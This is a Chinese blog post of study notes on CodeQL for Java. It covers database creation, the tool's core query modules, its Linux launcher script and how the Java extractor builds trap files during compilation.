<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="codeql_for_java, M1yuu">
    <meta name="description" content="codeql for java学习笔记杂项&amp;amp;&amp;amp;问题解决开导codeql database create codeql/micro-service-seclab-database --language=java  --comm">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>codeql_for_java | M1yuu</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 6.0.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>



   <style>
    body{
       background-image: url(https://w.wallhaven.cc/full/28/wallhaven-285e6x.png);
       background-repeat:no-repeat;
       background-size: 100% 100%;
       background-attachment:fixed;
    }
</style>



<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">M1yuu</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">M1yuu</div>
        <div class="logo-desc">
            
            君の指先を舞ってる電光は、私の一生変わらない信仰であり.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/L1gh73r" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/L1gh73r" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('https://s2.loli.net/2022/07/11/HXWcY6PTo8f1GO2.png')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">codeql_for_java</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/java%E5%AE%89%E5%85%A8/">
                                <span class="chip bg-color">java安全</span>
                            </a>
                        
                            <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
                                <span class="chip bg-color">学习记录</span>
                            </a>
                        
                            <a href="/tags/java-web/">
                                <span class="chip bg-color">java web</span>
                            </a>
                        
                            <a href="/tags/codeql/">
                                <span class="chip bg-color">codeql</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
                                web安全
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2022-07-11
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    7k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    34 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="codeql-for-java学习笔记"><a href="#codeql-for-java学习笔记" class="headerlink" title="codeql for java学习笔记"></a>codeql for java学习笔记</h1><h2 id="杂项-amp-amp-问题解决"><a href="#杂项-amp-amp-问题解决" class="headerlink" title="杂项&amp;&amp;问题解决"></a>杂项&amp;&amp;问题解决</h2><h3 id="开导"><a href="#开导" class="headerlink" title="开导"></a>开导</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">codeql database create codeql/micro-service-seclab-database <span class="token operator">--</span>language=java  <span class="token operator">--</span>command=<span class="token string">"mvn clean install --file pom.xml"</span> <span class="token operator">--</span>source-root=C:\Users\xxxxx\workspeace\micro_service_seclab-master<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="CodeQL三大核心模块："><a href="#CodeQL三大核心模块：" class="headerlink" title="CodeQL三大核心模块："></a>CodeQL三大核心模块：</h3><ul>
<li><strong>DataFlow模块</strong>：主要常用的就是taintedTracking和hasflow,flowto</li>
<li><strong>Smtm模块</strong>：常用于ast分析，就是ifStmt,TryStmt之类的代码分支</li>
<li><strong>Expr模块</strong>：最常用，例如MethodAccess,Method,call,callable,ClassInstanceExpr之类的一大堆类也是常用的，在定义sink 、source之类的必须要用到</li>
</ul>
<h2 id="CodeQL-数据库创建原理分析"><a href="#CodeQL-数据库创建原理分析" class="headerlink" title="CodeQL 数据库创建原理分析"></a>CodeQL 数据库创建原理分析</h2><p>原文地址：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1921/">https://paper.seebug.org/1921/</a></p>
<p><img src="https://s2.loli.net/2022/07/11/UE4newzpOa5BXjd.png" alt="img"></p>
<p>在<code>javac</code>编译目标代码时，通过<code>Extractor</code>与其进行交互。<code>Extractor</code>会根据每一个<code>java</code>文件的内容生成一个<code>trap</code>文件，后续再根据<code>trap</code>文件生成实际的数据库。同时它会将处理的每一个<code>java</code>文件拷贝一份保存在数据中，便于后续展示查询结果时能看到代码的上下文。</p>
<p>Linux下codeql启动脚本：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
<span class="token builtin class-name">set</span> -e

<span class="token function-name function">error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$@</span>"</span> <span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span><span class="token file-descriptor important">&amp;2</span>
    <span class="token builtin class-name">exit</span> <span class="token number">3</span> <span class="token comment"># SubcommandCommon.EXITCODE_LAUNCHERFAILURE</span>
<span class="token punctuation">}</span>

<span class="token assign-left variable">pwdExtraArg</span><span class="token operator">=</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable">$CODEQL_PLATFORM</span>"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token keyword">case</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> -s<span class="token variable">)</span></span>"</span> <span class="token keyword">in</span>
        *Linux*<span class="token punctuation">)</span>
            <span class="token assign-left variable">CODEQL_PLATFORM</span><span class="token operator">=</span>linux64
            <span class="token punctuation">;</span><span class="token punctuation">;</span>
        *Darwin*<span class="token punctuation">)</span>
            <span class="token assign-left variable">CODEQL_PLATFORM</span><span class="token operator">=</span>osx64
            <span class="token punctuation">;</span><span class="token punctuation">;</span>
        *MINGW* <span class="token operator">|</span> MSYS*<span class="token punctuation">)</span>
            <span class="token assign-left variable">CODEQL_PLATFORM</span><span class="token operator">=</span>win64
            <span class="token assign-left variable">pwdExtraArg</span><span class="token operator">=</span>-W
            <span class="token punctuation">;</span><span class="token punctuation">;</span>
        *<span class="token punctuation">)</span>
            error <span class="token string">"Unknown operating system '<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> -s<span class="token variable">)</span></span>' (full uname: <span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> -a<span class="token variable">)</span></span>."</span>
    <span class="token keyword">esac</span>
<span class="token keyword">fi</span>

<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> -z <span class="token string">"<span class="token variable">$CODEQL_DIST</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\</span>
     <span class="token punctuation">[</span> -f <span class="token string">"<span class="token variable">$CODEQL_DIST</span>/codeql"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\</span>
     <span class="token punctuation">[</span> -f <span class="token string">"<span class="token variable">$CODEQL_DIST</span>/tools/codeql.jar"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token builtin class-name">:</span> <span class="token comment"># This existing value looks trustworthy, probably computed by an enclosing</span>
      <span class="token comment"># instance of ourselves -- so don't bother with (expensive?) searching from $0.</span>
<span class="token keyword">else</span>
    <span class="token comment"># Follow links from $0 until we find one that looks right.</span>
    <span class="token comment"># (This way, users' own symlinks from their path into a dist will work,</span>
    <span class="token comment"># but a symlink farm replicating the dist will also work).</span>
    <span class="token assign-left variable">launcher</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$0</span>"</span>
    <span class="token assign-left variable">dirname</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">dirname</span> <span class="token string">"<span class="token variable">$launcher</span>"</span><span class="token variable">)</span></span>"</span>
    <span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token operator">!</span> -f <span class="token string">"<span class="token variable">$dirname</span>/tools/codeql.jar"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">do</span>
        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> -L <span class="token string">"<span class="token variable">$launcher</span>"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>
            error <span class="token string">"It does not look like <span class="token variable">$launcher</span> is located in a CodeQL distribution directory."</span>
        <span class="token keyword">fi</span>
        <span class="token assign-left variable">target</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span>readlink <span class="token string">"<span class="token variable">$launcher</span>"</span><span class="token variable">)</span></span>"</span>
        <span class="token keyword">case</span> <span class="token string">"<span class="token variable">$target</span>"</span> <span class="token keyword">in</span>
            /*<span class="token punctuation">)</span> <span class="token assign-left variable">launcher</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$target</span>"</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>
            *<span class="token punctuation">)</span>  <span class="token assign-left variable">launcher</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$dirname</span>/<span class="token variable">$target</span>"</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>
        <span class="token keyword">esac</span>
        <span class="token assign-left variable">dirname</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">dirname</span> <span class="token string">"<span class="token variable">$launcher</span>"</span><span class="token variable">)</span></span>"</span><span class="token punctuation">;</span>
    <span class="token keyword">done</span>
    <span class="token assign-left variable">CODEQL_DIST</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">cd</span> <span class="token string">"<span class="token variable">$dirname</span>"</span> <span class="token punctuation">;</span> <span class="token builtin class-name">pwd</span> $pwdExtraArg<span class="token variable">)</span></span>"</span>
<span class="token keyword">fi</span>

<span class="token comment"># Check if we're writing to a terminal</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> -t <span class="token number">2</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span> <span class="token builtin class-name">export</span> <span class="token assign-left variable">CODEQL_ISATTY</span><span class="token operator">=</span>stderr <span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token builtin class-name">unset</span> CODEQL_ISATTY <span class="token punctuation">;</span> <span class="token keyword">fi</span>

<span class="token builtin class-name">export</span> CODEQL_DIST
<span class="token builtin class-name">export</span> CODEQL_PLATFORM

<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$CODEQL_PLATFORM</span>"</span> <span class="token operator">=</span> <span class="token string">"osx64"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
  <span class="token comment"># On macOS we need to run outside the Downloads directory, and ensure that</span>
  <span class="token comment"># we have cleared all tools from quarantine.</span>

  <span class="token assign-left variable">downloads</span><span class="token operator">=</span><span class="token string">"<span class="token environment constant">$HOME</span>/Downloads"</span>
  <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"x<span class="token variable">${CODEQL_DIST<span class="token operator">#</span>$downloads}</span>"</span> <span class="token operator">!=</span> <span class="token string">"x<span class="token variable">$CODEQL_DIST</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    error <span class="token string">"\
Cannot run CodeQL from within Downloads directory, because of security
restrictions placed on that directory.  Please move the CodeQL distribution
to a location outside the Downloads directory tree.

CodeQL distribution: <span class="token variable">${CODEQL_DIST}</span>
Downloads directory: <span class="token variable">${downloads}</span>"</span>
  <span class="token keyword">fi</span>

  <span class="token keyword">if</span> <span class="token punctuation">[</span> -w <span class="token string">"<span class="token variable">${CODEQL_DIST}</span>"</span> -a -w <span class="token string">"<span class="token variable">${CODEQL_DIST}</span>/codeql"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token keyword">if</span> <span class="token punctuation">[</span> -f /usr/bin/xattr <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
      <span class="token comment"># If /usr/bin/xattr exists, we know that's the default version of xattr</span>
      <span class="token comment"># that Mac OS bundles rather than a GNU one. This is what we want, so</span>
      <span class="token comment"># use that.</span>
      <span class="token assign-left variable">XATTR_PATH</span><span class="token operator">=</span>/usr/bin/xattr
    <span class="token keyword">else</span>
      <span class="token comment"># There's nothing at /usr/bin/xattr. This is strange, but let's continue</span>
      <span class="token comment"># anyway and use whatever we find on the PATH, hoping it's a Mac OS</span>
      <span class="token comment"># version too. This ensures forward compatibility with a future Mac OS</span>
      <span class="token comment"># that moves where xattr is located.</span>
      <span class="token assign-left variable">XATTR_PATH</span><span class="token operator">=</span>xattr
    <span class="token keyword">fi</span>
    <span class="token comment"># Similarly, use /usr/bin/find and /usr/bin/xargs, which also differ sufficiently</span>
    <span class="token comment"># between the BSD and GNU implementations to break our usage here:</span>
    <span class="token keyword">if</span> <span class="token punctuation">[</span> -f /usr/bin/find <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
      <span class="token assign-left variable">FIND_PATH</span><span class="token operator">=</span>/usr/bin/find
    <span class="token keyword">else</span>
      <span class="token assign-left variable">FIND_PATH</span><span class="token operator">=</span>find
    <span class="token keyword">fi</span>
    <span class="token keyword">if</span> <span class="token punctuation">[</span> -f /usr/bin/xargs <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
      <span class="token assign-left variable">XARGS_PATH</span><span class="token operator">=</span>/usr/bin/xargs
    <span class="token keyword">else</span>
      <span class="token assign-left variable">XARGS_PATH</span><span class="token operator">=</span>xargs
    <span class="token keyword">fi</span>
    
    <span class="token string">"<span class="token variable">$FIND_PATH</span>"</span> <span class="token string">"<span class="token variable">${CODEQL_DIST}</span>"</span> <span class="token string">"("</span> -path <span class="token string">"*/osx64/*"</span> -o -path <span class="token string">"*/macos/*"</span> <span class="token string">")"</span> -a <span class="token punctuation">\</span>
      <span class="token string">"("</span> -perm -100 -o -perm -10 -o -perm -1 -o -name <span class="token string">"*.dll"</span> <span class="token string">")"</span> -a <span class="token punctuation">\</span>
      <span class="token string">"!"</span> -type d -a -xattr -print0 <span class="token operator">|</span> <span class="token string">"<span class="token variable">$XARGS_PATH</span>"</span> -0 -- <span class="token string">"<span class="token variable">$XATTR_PATH</span>"</span> -c
    <span class="token string">"<span class="token variable">$XATTR_PATH</span>"</span> -c <span class="token string">"<span class="token variable">${CODEQL_DIST}</span>/codeql"</span>
    <span class="token function">chmod</span> a-w <span class="token string">"<span class="token variable">${CODEQL_DIST}</span>/codeql"</span>
  <span class="token keyword">fi</span>
<span class="token keyword">fi</span>

<span class="token assign-left variable">jvmArgs</span><span class="token operator">=</span><span class="token string">""</span>
<span class="token assign-left variable">takeNext</span><span class="token operator">=</span>false
<span class="token keyword">for</span> <span class="token for-or-select variable">arg</span> <span class="token keyword">in</span> <span class="token string">"<span class="token variable">$@</span>"</span> <span class="token punctuation">;</span> <span class="token keyword">do</span>
    <span class="token keyword">if</span> <span class="token variable">$takeNext</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"x<span class="token variable">$arg</span>"</span> <span class="token operator">!=</span> <span class="token string">"x--"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>
        <span class="token assign-left variable">jvmArgs</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$jvmArgs</span> <span class="token variable">$arg</span>"</span>
        <span class="token assign-left variable">takeNext</span><span class="token operator">=</span>false
    <span class="token keyword">else</span>
        <span class="token keyword">case</span> <span class="token string">"<span class="token variable">$arg</span>"</span> <span class="token keyword">in</span>
            -J<span class="token punctuation">)</span>   <span class="token assign-left variable">takeNext</span><span class="token operator">=</span>true <span class="token punctuation">;</span><span class="token punctuation">;</span>
            -J<span class="token operator">=</span>*<span class="token punctuation">)</span> <span class="token assign-left variable">jvmArgs</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$jvmArgs</span> <span class="token variable">${arg<span class="token operator">#</span>-J=}</span>"</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>
            -J*<span class="token punctuation">)</span>  <span class="token assign-left variable">jvmArgs</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$jvmArgs</span> <span class="token variable">${arg<span class="token operator">#</span>-J}</span>"</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>
            --<span class="token punctuation">)</span>   <span class="token builtin class-name">break</span> <span class="token punctuation">;</span><span class="token punctuation">;</span>
        <span class="token keyword">esac</span>
    <span class="token keyword">fi</span>
<span class="token keyword">done</span>

<span class="token assign-left variable">arch</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">uname</span> -m<span class="token variable">)</span></span>"</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$CODEQL_PLATFORM</span>"</span> <span class="token operator">=</span> <span class="token string">"osx64"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$arch</span>"</span> <span class="token operator">=</span> <span class="token string">"arm64"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token builtin class-name">:</span> <span class="token variable">${CODEQL_JAVA_HOME<span class="token operator">:=</span>$CODEQL_DIST<span class="token operator">/</span>tools<span class="token operator">/</span>$CODEQL_PLATFORM<span class="token operator">/</span>java-aarch64}</span>
<span class="token keyword">else</span>
    <span class="token builtin class-name">:</span> <span class="token variable">${CODEQL_JAVA_HOME<span class="token operator">:=</span>$CODEQL_DIST<span class="token operator">/</span>tools<span class="token operator">/</span>$CODEQL_PLATFORM<span class="token operator">/</span>java}</span>
<span class="token keyword">fi</span>

<span class="token builtin class-name">exec</span> <span class="token string">"<span class="token variable">${CODEQL_JAVA_HOME}</span>/bin/java"</span> <span class="token punctuation">\</span>
    <span class="token variable">$jvmArgs</span> <span class="token punctuation">\</span>
    --add-modules jdk.unsupported <span class="token punctuation">\</span>
    -cp <span class="token string">"<span class="token variable">$CODEQL_DIST</span>/tools/codeql.jar"</span> <span class="token punctuation">\</span>
    <span class="token string">"com.semmle.cli2.CodeQL"</span> <span class="token string">"<span class="token variable">$@</span>"</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>设置环境变量<code>CODEQL_PLATFORM</code>，<code>CODEQL_JAVA_HOME</code>和<code>CODEQL_DIST</code>后，执行<code>codeql.jar</code></p>
<p>在<code>codeql\codeql\java\tools</code>目录下：</p>
<p><img src="https://s2.loli.net/2022/07/11/GIfFmW1C4wNyLER.png" alt="image-20220627102955739"></p>
<p>可以看到一些<code>jar</code>包和脚本，以及配置文件<code>codeql-extractor.yml</code>。<code>codeql-java-agent.jar</code>为<code>agent</code>，在整个编译期开始前注入<code>jvm</code>中并用于执行<code>extractor</code>操作</p>
<p>整个<code>Extractor</code>的工作流程</p>
<ul>
<li>根据<code>javac</code>配置文件创建<code>javac compiler</code>对象</li>
<li><code>javac</code>对源码一次进行预处理</li>
<li>根据前一步出的处理结果，构造<code>trap</code>文件</li>
</ul>
